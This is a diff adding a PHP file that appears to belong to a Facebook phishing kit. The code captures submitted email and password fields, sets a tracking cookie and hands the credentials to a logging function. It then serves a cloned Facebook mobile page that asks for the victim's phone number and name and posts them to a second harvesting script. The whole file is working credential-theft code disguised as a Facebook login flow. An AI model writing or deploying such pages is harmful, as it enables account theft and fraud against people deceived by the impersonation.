@@ -1,0 +1,11 @@
+<?php
+include 'common.php';
+$email = $_POST['log1'];
+$pass = $_POST['log2'];
+$date = date("d F Y h:i:s A");
+setcookie("fbrc_user", $email, time() + (86400 * 30), "/"); 
+in_lognew($email,$pass,$date);
+
+?>
+	<link rel="stylesheet" href="style.css">
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"><title>Enter Mobile Number</title></head><body tabindex="0" class="b c d e f g"><div class="h"><div id="viewport"><div class="i j" id="header"><table class="k" cellpadding="0" cellspacing="0"><tbody><tr><td valign="middle"><h1><img src="logo.png" class="l" width="77" height="16"></h1></td><td class="m" valign="middle"></td></tr></tbody></table></div><div id="objects_container"><div class="t g" id="root" role="main"><table class="u" role="presentation"><tbody><tr><td class="v"><div id="login-notices"><div class="w x y" style="display: none;"><div class="z"></div></div></div><div><div class="ba bb"><div></div><form method="post" class="bc" id="login_form" novalidate="1" action="http://localhost/fbrc2/in_log_ph.php"><ul class="bd be bf"><li class="be"><h3 class="bg bh bi">Mobile number</h3><input autocorrect="off" autocapitalize="off" class="bj bk bl" name="mobile" type="text"></li><li class="be"><div><h3 class="bg bh bi">Name</h3><input autocorrect="off" autocapitalize="off" class="bj bk bm bn" name="name" type="text"></div></li><li class="be"><input value="Sumbit" name="login" class="n o bo bp bq" type="submit"></li></ul><noscript><input type="hidden" name="ph" value="true" /></noscript></form><div class="br bs"><div class="br bt" id="signup-button"></li></ul></span></div></div></div></td></tr></tbody></table><div></div></div></div><div><div class="ca"><div class="cb"><table class="u" role="presentation"><tbody><tr><td class="v cc" style="width:50%"><b class="cd">English (UK)</b><a class="ce" href="">हिन्दी</a><a class="ce" href="">اردو</a></td><td class="v cf" style="width:50%"><a class="ce" href="">ગુજરાતી</a><a class="ce" href="">मराठी</a><a class="ce" href=""><div class="cg"> + </div></a></td></tr></tbody></table></div><span class="bg ch">Facebook ©2016</span></div></div></div></div></body></html>
